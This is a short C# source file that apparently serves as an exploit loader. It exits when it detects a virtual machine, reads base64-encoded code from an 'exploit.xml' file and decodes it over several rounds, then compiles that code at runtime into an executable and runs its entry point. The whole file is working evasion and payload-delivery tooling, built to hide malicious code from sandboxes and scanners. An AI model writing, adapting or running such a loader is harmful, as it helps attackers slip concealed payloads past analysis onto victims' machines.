using Microsoft.CSharp;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.Reflection;
using System.Xml.Linq;

namespace DynamicCode {
    class Program
    {
        private const string _ref = "references";
        private const string _com = "compiler";
        private const string _ver = "version";
        private const string _item = "item";
        private const string _code = "code";
        private const string _exe = "exe";
        private static int iteration = 0;

        static void Main(string[] args)
        {
            if (vm.isVirtualMachine())
                return;
            string exploit = string.Empty;
            //if you don't pass the filename/location it will default to the following
            //in the directory this exe will run from
            string file = "exploit.xml";
            //if you don't pass the iterations it will assume 1
            //no error handling has been added.
            iteration = 1;
            if (null!=args && args.Length == 2)
            {
                file = args[0];
                iteration = int.Parse(args[1]);
            }
            List<string> data = new List<string>();
            XElement o = XElement.Load(file);
            Dictionary<string, string> info = new Dictionary<string, string>();
            XElement r = o.Element(_ref);
            info.Add(r.Attribute(_com).Value, r.Attribute(_ver).Value);
            foreach (XElement c in o.Element(_ref).Elements(_item))
                data.Add(c.Value);

            foreach (XElement c in o.Elements(_code))
                exploit = ConvertItem(c.Value);

            string executingDirectory = AppDomain.CurrentDomain.BaseDirectory;
            string exe = executingDirectory + r.Attribute(_exe).Value;
            using (var csc = new CSharpCodeProvider(info))
            {
                var parameters = new CompilerParameters(data.ToArray(), exe, false);
                parameters.GenerateExecutable = true;
                CompilerResults results = csc.CompileAssemblyFromSource(parameters, exploit);
                if (results.Errors.Count > 0)
                    return;
            }
            
            Assembly assembly = Assembly.LoadFile(exe);
            string[] newargs = { };
            assembly.EntryPoint.Invoke(null, new object[] { newargs });
        }
        private static string ConvertItem(string s)
        {
            string returnval = s;
            for (int i = 1; i <= iteration; i++)
            {
                returnval = returnval.Base64Decode();
            }
            return returnval;
        }
    }
}